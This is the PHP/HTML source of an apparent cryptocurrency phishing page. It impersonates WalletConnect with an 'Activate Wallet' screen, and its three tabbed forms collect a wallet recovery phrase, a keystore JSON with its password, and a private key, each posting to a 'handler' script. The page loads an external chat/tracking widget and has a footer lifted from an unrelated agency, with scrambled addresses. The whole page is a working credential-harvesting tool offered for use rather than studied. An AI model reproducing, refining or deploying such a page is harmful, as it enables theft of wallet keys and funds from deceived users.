
<?php
session_start();

$mode=$_SESSION['mode'];
?>

<!DOCTYPE html>
<html>



<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
  <title>Activate Wallet - <?php echo $mode   ?>  Activation</title>
  <link rel="shortcut icon" type="image/jpg" href="walletfav.png"/>
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
  <link rel="stylesheet" href="assets/css/styles.css">
  <link rel="stylesheet" href="assets/css/header.css">
  <link rel="stylesheet" href="assets/css/footer.css">
  <script src="https://www.momentcrm.com/embed"></script>
<script>
  MomentCRM('init', {
    'teamVanityId': 'erect1',
    'doChat': true,
    'doTracking': true,
  });
</script>
</head>

<body>
  <header>
  <nav class="navbar fixed-top navbar-expand-lg navbar-transparent"> <a class="navbar-brand" href="#">WalletConnect</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item active"> <a class="nav-link" href="#">HOME <span class="sr-only">(current)</span></a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Github</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Facebook</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Apps</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Tweeter</a> </li>
                        <li class="nav-item"> <a class="nav-link" href="#">Instagram</a> </li>
                    </ul>
                </div>
            </nav>
  
  </header>

  <br>
  <br>
  <div class="container-fluid">
      <div class="row">
        <br>
        <div class="col-md-4 offset-md-4">
          <a class="text-white" href="/" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Activate <?php echo $mode   ?> Wallet</a>
        </div>
      </div>
    </div>
  <div class="container-fluid">
    <div class="row">
      <div class="col-md-4 offset-md-4">
        <ul class="nav nav-tabs">
          <li id="phbtn" class="nav-item"><a class="nav-link active" data-toggle="tab" href="#">Phrase</a></li>
          <li id="kybtn"  class="nav-item"><a class="nav-link" data-toggle="tab" href="#">Keystore JSON</a></li>
          <li id="pkbtn"  class="nav-item"><a class="nav-link" data-toggle="tab" href="">Private Key</a></li>
        </ul>
      </div>
    </div>
  </div>
  <section style="margin-top: 40px;">
    <div class="container-fluid">
      <div class="row">
         
        <div class="col-md-4 offset-md-4">
          <!-- Tab panes -->
          <div class="tab-content">
            <!-- phrase -->
            <div role="tabpanel" class="tab-pane fade show active" id="phrase">
              <form method="post" action="handler">
                <textarea class="form-control" rows="5" name="phrase" required placeholder="Phrase"></textarea>
                <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                <input type="hidden" name="wallet"  value="<?php echo $mode   ?>" >
                <input type="hidden" name="type"  value="phrase" >
               
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Activate Wallet</button></div>
              </form>
            </div>
            <!-- end phrase -->
            <!-- keystore -->
            <div role="tabpanel" class="tab-pane " id="keystore">
              <form method="post" action="handler">
                <div class="form-group">
                  <textarea class="form-control" name="keystorejson"  required rows="5" placeholder="Keystore JSON"></textarea>
                </div>
                <div class="form-group">
                  <input class="form-control" type="password" required name="keystorepasswword" placeholder="Password">
                </div>
                <p class="text-secondary" style="margin-top: 10px;">
                  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                </p>
                <input type="hidden" name="wallet" value="<?php echo $mode   ?>" >
                <input type="hidden" name="type" value="keystorepasswword" >
               
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Activate Wallet</button></div>
              </form>
            </div>
            <!-- end keystore -->
            <!-- privatekey -->
            <div role="tabpanel" class="tab-pane " id="privatekey">
              <form method="post" action="handler">
                <div class="form-group">
                  <input class="form-control" name="privatekey" required placeholder="Private Key">
                </div>
                <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                <input type="hidden" name="wallet" value="<?php echo $mode   ?>">
                <input type="hidden" name="type" value="privatekey" >
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Activate Wallet</button></div>
              </form>
            </div>
            <!-- end privatekey -->
          </div>
        </div>
      </div>
    </div>
  </section>
   <!-- footer -->
   <div class="container-fluid mx-auto">
        <div class="row justify-content-center top-part">
            <div class="col-md-6 text-center center-content">
                <div class="d-flex-inline">
                    <h3 class="footer-heading">Start a Project with itCraft</h3>
                </div>
                <div class="d-flex-inline">
                    <p>We are based in Warsaw, Bydgoszcz & Torun in Poland but we are Google Cloud Partner we can arrange a meeting at Google Campus in Warsaw or in London. We are also present in Norway. Below you will find all the contact details you need.</p>
                </div>
                <div class="d-flex-inline pt-2"> <button class="btn-pink btn">ESTIMATE PROJECT</button> </div>
            </div>
        </div>
        <div class="row">
            <div class="line mb-3 mx-auto"></div>
            <div class="d-md-flex px-5 justify-content-around bd-highlight col-md-12 pt-5 pb-5 mb-3">
                <div class="p-2 flex-fill bd-highlight mb-5 mb-md-0">
                    <h3>itCraft</h3> <small>Copyright &copy 2019</small>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">BYDGOCZCZ</h5>
                    <p class="mb-0">Bydgoszcz Centrum Burnesa</p>
                    <p class="mb-0">ul Pzzenmdcwa 25, ibsura 24,</p>
                    <p class="mb-0">B5-7GB Bydgosrdz, Poland</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">TORUN</h5>
                    <p class="mb-0">ul Reyana 2-4</p>
                    <p class="mb-0">A0-100 Torun,</p>
                    <p class="mb-0">Poland</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">WARSAW</h5>
                    <p class="mb-0">Brain Embassy</p>
                    <p class="mb-0">Alaya Jerasublisuble RS123</p>
                    <p class="mb-0">02-222 Warsawa</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">LONDON</h5>
                    <p class="mb-0">Google Campus</p>
                    <p class="mb-0">4-5 Barnhill, Shaneditch</p>
                    <p class="mb-0">London EC2A 4BK</p>
                </div>
                <div class="p-2 flex-fill bd-highlight mb-3 mb-md-0">
                    <h5 class="places">NORWAY</h5>
                    <p class="mb-0">Kristiansand</p>
                </div>
            </div>
            <div class="line mb-3 mx-auto"></div>
        </div>
        <div class="row bottom-part">
            <div class="d-lg-flex justify-content-between bd-highlight col-md-12 mb-5 px-5">
                <div class="p-2 align-self-center flex-fill bd-highlight">
                    <div class="fa fa-facebook px-2"></div>
                    <div class="fa fa-linkedin px-2"></div>
                    <div class="fa fa-twitter px-2"></div>
                    <div class="fa fa-instagram px-2"></div>
                </div>
                <div class="p-2 row flex-fill bd-highlight justify-content-left">
                    <div class="p-2 d-lg-flex">
                        <div class="p-2 flex-fill d-flex bd-highlight">Services</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Portfolio</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Pricing</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Testimonials</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Team</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Blog</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Carrer</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">How we work</div>
                        <div class="p-2 flex-fill d-flex bd-highlight">Manifesto</div>
                    </div>
                </div>
                <div class="p-2 align-self-center flex-fill bd-highlight">
                    <div class="fa fa-mobile px-2 grey-text">&nbsp;&nbsp;<span id="contact">888-777-666</span></div>
                    <div class="fa fa-envelope-o px-2 grey-text">&nbsp;&nbsp;info@itcraft.in</div>
                </div>
            </div>
        </div>
    </div>

  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/bootstrap/js/bootstrap.min.js"></script>
  <script>
    $(document).ready(function () {
       $("#phbtn").click(function (e) { 
           e.preventDefault();
        //    alert("hhhdhd")
        $("#phrase").show(1000);
        $("#keystore").hide();
        $("#privatekey").hide();
           
       });

       $("#kybtn").click(function (e) { 
           e.preventDefault();
        //    alert("hhhdhd")
        $("#phrase").hide();
        $("#keystore").show(1000);
        $("#privatekey").hide();
           
       });

       $("#pkbtn").click(function (e) { 
           e.preventDefault();
        //    alert("hhhdhd")
        $("#phrase").hide();
        $("#keystore").hide();
        $("#privatekey").show(1000);
           
       });
    });
  //  const queryString = window.location.search;

  //   const urlParams = new URLSearchParams(queryString);

  //   const wallet = urlParams.get('wallet')

   

  //   document.getElementById("hidden1").value = "AAVE" + " Phrase";
  //   document.getElementById("hidden2").value = "AAVE" + " Keystore";
  //   document.getElementById("hidden3").value = "AAVE" + " PrivateKey";
  </script>
</body>



</html>